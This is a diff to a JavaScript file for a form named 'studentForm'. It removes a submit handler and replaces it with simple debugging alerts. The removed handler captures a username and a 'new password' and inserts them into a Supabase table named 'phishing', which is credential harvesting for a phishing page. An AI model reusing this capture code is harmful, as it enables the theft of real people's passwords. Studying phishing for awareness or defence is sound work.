@@ -1,55 +1,24 @@
-document
-.getElementById("studentForm")
-.addEventListener("submit", async function(e){
+alert("JavaScript Loaded");
 
-    e.preventDefault();
+const form = document.getElementById("studentForm");
 
-    try{
+console.log(form);
 
-        const username =
-        document.getElementById("uname").value;
+if(form){
 
-        const newPassword =
-        document.getElementById("newpass").value;
+    alert("Form Found");
 
-        alert("Connecting to Supabase...");
+    form.addEventListener("submit", function(e){
 
-        const { data, error } =
-        await client
-        .from("phishing")
-        .insert([
-            {
-                username: username,
-                password: newPassword
-            }
-        ])
-        .select();
+        e.preventDefault();
 
-        if(error){
+        alert("Button clicked");
 
-            console.log(error);
+    });
 
-            alert(
-                "SUPABASE ERROR:\n\n" +
-                JSON.stringify(error)
-            );
+}
+else{
 
-            return;
-        }
+    alert("Form NOT Found");
 
-        alert(
-            "SUCCESS\n\n" +
-            JSON.stringify(data)
-        );
-
-    }
-    catch(err){
-
-        console.log(err);
-
-        alert(
-            "JAVASCRIPT ERROR:\n\n" +
-            err.message
-        );
-    }
-});
+}
